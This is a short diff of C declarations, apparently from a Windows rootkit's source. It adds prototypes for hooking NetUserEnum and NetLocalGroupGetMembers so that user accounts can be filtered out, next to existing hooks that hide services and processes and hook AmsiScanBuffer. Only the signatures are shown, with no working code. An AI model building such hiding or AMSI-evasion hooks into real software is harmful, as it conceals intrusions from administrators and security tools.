@@ -39,6 +39,8 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_RAW_COUNTER_ITEM_W itemBuffer);
 static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_FMT_COUNTERVALUE_ITEM_W itemBuffer);
 static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, ULONG length, LPCWSTR contentName, LPVOID amsiSession, LPDWORD result);
+static NET_API_STATUS WINAPI HookedNetUserEnum(LPCWSTR servername, DWORD level, DWORD filter, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
+static NET_API_STATUS WINAPI HookedNetLocalGroupGetMembers(LPCWSTR servername, LPCWSTR localgroupname, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, PDWORD_PTR resumehandle);
 
 static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter);
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime);
@@ -50,6 +52,9 @@ static VOID FilterEnumServiceStatusA(LPENUM_SERVICE_STATUSA services, LPDWORD se
 static VOID FilterEnumServiceStatusW(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned);
 static VOID FilterEnumServiceStatusProcessA(LPENUM_SERVICE_STATUS_PROCESSA services, LPDWORD servicesReturned);
 static VOID FilterEnumServiceStatusProcessW(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned);
+static VOID FilterNetUserEnum(DWORD level, LPBYTE bufptr, LPDWORD entriesread, LPDWORD totalentries);
+static VOID FilterNetLocalGroupGetMembers(DWORD level, LPBYTE bufptr, LPDWORD entriesread, LPDWORD totalentries);
+static LPWSTR ExtractUserNameFromDomainName(LPCWSTR domainAndName);
 static BOOL GetIsHiddenFromPdhString(LPCWSTR str);
 static DWORD GetProcessIdFromPdhString(LPCWSTR str);
 
